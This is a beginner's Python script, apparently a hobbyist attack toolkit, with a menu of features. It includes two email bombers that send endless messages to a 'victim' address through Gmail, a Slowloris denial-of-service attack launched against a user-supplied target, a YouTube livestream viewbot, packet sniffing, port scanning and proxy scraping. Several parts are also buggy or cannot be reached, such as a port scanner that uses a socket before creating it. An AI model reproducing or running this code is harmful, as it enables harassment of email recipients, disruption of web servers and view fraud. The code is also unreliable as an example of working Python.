import socket
from typing import Set
import ipinfo
from requests.models import to_key_val_list
from scapy.all import *
import time
from selenium import webdriver
from art import tprint
import ctypes, os
import getpass
import time
import smtplib as smtp
import platform
import webbrowser
from pyslowloris import HostAddress, SlowLorisAttack
import selenium.webdriver.common
import proxyscrape
from Proxy_List_Scrapper import Scrapper
from urllib.request import Request, urlopen
from email.message import EmailMessage

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    if platform.system() == "Darwin":
        os.system("clear")
    if platform.system() == "Linux":
        os.system("clear")

def menu():
    clear()
    print("Welcome to")
    tprint("Go Fuck Yourself")
    if (platform.system()) == "Windows":
        print("System: Windows!")
    if (platform.system()) == "Linux":
        print("System: Linux!")
    if (platform.system()) == "Darwin":
        print("System: MacOS!\nI hope its an Hackintosh!")
    print("\n")
    print("Reworked Version!")
    print("[1] GeoIP")
    print("[2] Settings")
    print("[3] Mail Spammer")
    print("[4] More Features!")
    print("[5] Credits")
    print("[0] Exit")
menu()

def option3():
    clear()
    tprint("Mail Spammer!")
    print("\n")
    print("To Stop the Spammer just press CTRL+C")
    print("Use an Trash Gmail Account and set the Lesser Secure Apps to true in the Settings to use this Feature!")
    print("[1] Stable Spammer\n [2] Unstable Spammer")
    Spammer = int(input("Enter Option: "))
    if Spammer == 1:
        x = 0
        clear()
        tprint("Mail Spammer!")
        print("This Spammer can get you kicked out after 100 Mails. Working on this too!")
        Sender = input("Your Email Address: ")
        SenderPass = getpass.getpass("Your Email Password: ")
        Victim = input("Victims Mail Address: ")
        Server = smtp.SMTP("smtp.gmail.com:587")
        Server.starttls()
        Message = input("Enter your Message: ")
        Server.login(Sender, SenderPass)
        print("Logged in..")
        i = input("Press 1 to start and to Stop CTRL+C: ")
        while i==i:
            x += 1
            Server.sendmail(Sender, Victim, Message)
            print("%s | Mail Send!" %x)
        if x >= 100:
            time.sleep(20)
    if Spammer == 2:
        clear()
        tprint("Mail Spammer!")
        print("Experimental Version includes: Attachments, Headers")
        g = 0
        Sender = input("Enter Your Mail Address: ")
        SenderPass = getpass.getpass("Enter your Password: ")
        Victim = input("Enter Victims Mail Address: ")
        s = smtp.SMTP("smtp.gmail.com", 587)
        s.starttls()
        s.login(Sender, SenderPass)
        print("Logged in!")
        msg = EmailMessage()
        msg["Subject"] = input("Enter your Subject: ")
        msg["From"] = Sender
        msg["To"] = Victim
        msg.set_content(input("Enter your Message: "))
        c = input("Enter 1 to Start: ")
        while c == c:
            g += 1
            s.send_message(msg)
            print("%s | Send Mail!" %g)
        input("Press Enter To Continue!")
        menu()

def option2():
    clear()
    tprint("Options")
    print("[1] Disable/Enable Password")
    Underwear = int(input("Enter your Option: "))
    if Underwear == 1:
        print("Password for an Script ?! \n your an Dummy!")
        input("Press any Key to get back to the Menu! ")
        menu()

def option4():
    clear()
    tprint("More Features!")
    print("[1] Port Scanning(Broken)\n[2] Proxy Scrapper\n[3] Youtube Livestream Viewbot  \n[4] Packet Sniffing\n[0] Back to Menu")
    Settings = int(input("Enter your Option: "))

    if Settings == 1:
        clear()
        tprint("Port Scanner")
        plist = [21, 22, 23, 25, 53, 80, 110, 115, 135, 139, 143, 194, 443, 445, 1433, 3306, 3389, 5632, 5900, 25565]
        Direction = input("Enter IP to Scan: ")
        print("Scanning... \n Please Wait")
        for port in plist:
            result = sock.connect_ex((Direction, plist))
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            openport = sock.connect_ex((Direction, port))
            if result == 0:
                print("Port" + str(port) + "Open!")
            sock.close()
        input("Press any Key to get back to the Menu! ")
        menu()

    if Settings == 2:
        clear()
        i = 0
        x = 0
        tprint("Proxyscraping")
        ProxyScraping = int(input(""))
        if ProxyScraping == 1:
            clear()
            tprint("Proxy_List_Scrapper")  
            SSL = 'https://www.sslproxies.org/',
            GOOGLE = 'https://www.google-proxy.net/',
            ANANY = 'https://free-proxy-list.net/anonymous-proxy.html',
            UK = 'https://free-proxy-list.net/uk-proxy.html',
            US = 'https://www.us-proxy.org/',
            NEW = 'https://free-proxy-list.net/',
            SPYS_ME = 'http://spys.me/proxy.txt',
            PROXYSCRAPE = 'https://api.proxyscrape.com/?request=getproxies&proxytype=all&country=all&ssl=all&anonymity=all',
            PROXYNOVA = 'https://www.proxynova.com/proxy-server-list/'
            PROXYLIST_DOWNLOAD_HTTP = 'https://www.proxy-list.download/HTTP'
            PROXYLIST_DOWNLOAD_HTTPS = 'https://www.proxy-list.download/HTTPS'
            PROXYLIST_DOWNLOAD_SOCKS4 = 'https://www.proxy-list.download/SOCKS4'
            PROXYLIST_DOWNLOAD_SOCKS5 = 'https://www.proxy-list.download/SOCKS5'
            ALL = 'ALL'
            print("Categories: SSL, GOOGLE, ANANY, UK, US, NEW, SPYS_ME, PROXYSCRAPE, PROXYNOVA, PROXYLIST_DOWNLOAD_HTTP, PROXYLIST_DOWNLOAD_HTTPS, PROXYLIST_DOWNLOAD_SOCKS4, PROXYLIST_DOWNLOAD_PROXY5, ALL")
            print("\n")
            scrapper = Scrapper(category=str(input("Enter Category: ")), print_err_trace=False)
            data = scrapper.getProxies()
            print("Scrapped: ")
            while os.path.exists("Proxy%s.txt" % i):
                i+=1
            for item in data.proxies:
                f = open("Proxy%s.txt" % i, "a")
                f.write("{}:{}\n".format(item.ip,item.port))
            print("Total Proxies:", data.len)
            print("Saved Scrapped Proxys to Proxy%s.txt" % i)
        if ProxyScraping == 2:
            clear()
            tprint("Proxyscrape API")
            name = input("Name your Collector: ")
            c = input("Enter Proxy Country: ")
            print("[1] True\n [2] False")
            r = int(input("Adding Resource?:"))
            collector = proxyscrape.create_collector(name, input("Enter Proxy Type: "))
            if c == None:
                collector.get_proxies()
                #while os.path.exists("Proxyscrape%s.txt" % x):
                    #x+=1
                #for item in collector.get_proxies():
                    #f = open ("Proxyscrape%s.txt" % x, "a")
                    #f.write(collector.get_proxies())
            if c != None:
                collector.get_proxies({"country": c})
            if r == 1:
                pass
        input("Press any key to progress")
        menu()

    if Settings == 6:
        webbrowser.get("google-chrome").open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

    if Settings == 3:
        x = 0
        v = int(input("How many Views: "))
        link = input("Livestream Link: ")
        driver = webdriver.PhantomJS(executable_path="C:\\Users\\Bannatz\\Desktop\\phantomjs-2.1.1-windows\\bin\\phantomjs")
        while v==v:
            driver.get(link)
    if Settings == 4:
        tprint("Packet Sniffing!")
        print("\n")
        print("If its not Working please setup a Issue in Github!")
        print("Available Filter: TCP, UDP, NONE")
        filter = input("Enter Filter: ")
        t = AsyncSniffer(prn=lambda x: x.summary(), store=False, filter=filter)
        t.start()
    if Settings == 5:
        tprint("Slow Loris")
        url = HostAddress.from_url(str(input("Enter Target: ")))
        connection_count = int(input("Connections: "))
        loris = SlowLorisAttack(url, connection_count, silent=True)
        loris.start()

        
def option1():
    tprint("GeoIP")
    print("[1] Url2IP\n[2] Get GeoLocation\n[0] Back to Menu!")
    GIPSettings = int(input("Enter your Option: "))
    if GIPSettings == 1:
        print(socket.gethostbyname(input("Enter the Website: ")))
        input("Press any Key to get back to the Menu! ")
        menu()
    if GIPSettings == 2:
        print("if you dont have an IPInfo Token please Register at IPInfo!\n Its Free and you got 50000/50k Free Searches")
        if(os.path.isfile("token.dat")) == False:
            f = open("token.dat", "w")
            f.write(str(input("Enter Token: ")))

        f = open("token.dat", "r")
        AccessToken = f.read()
        handler = ipinfo.getHandler(AccessToken)


        IP_Target = input("IP for GeoLocation: ")
        handler.getDetails(IP_Target)
        details = handler.getDetails(IP_Target)

        f = open("GeoIP.json", "w")
        f.write(str(details.all))
        f.close()
        print("Output: GeoIP.json")
        input("Press any Key to get back to the Menu! ")
        menu()


def option5():
    clear()
    tprint("Credits")
    print("Thanks for Using This Tool! \nits made by Bannatz! \nim an beginner in Python. \ni just want to say this script is by no means Perfect! \nIm trying my best to Learn Python and understand what Python is capable of!")
    print("")
    input("Press any Key to get back to the Menu! ")
    menu()

option = int(input("Enter your Option: "))

while option != 0:
    if option == 1:
        clear()
        option1()
        pass
    elif option == 2:
        clear()
        option2()
        pass
    elif option == 3:
        option3()
        pass
    elif option == 4:
        option4()
        pass
    elif option == 5:
        option5()
        pass
    else:
        print("Invalid Option!")
    menu()
    option = int(input("Enter your Option: "))
clear()
tprint("Work in Progress!")
    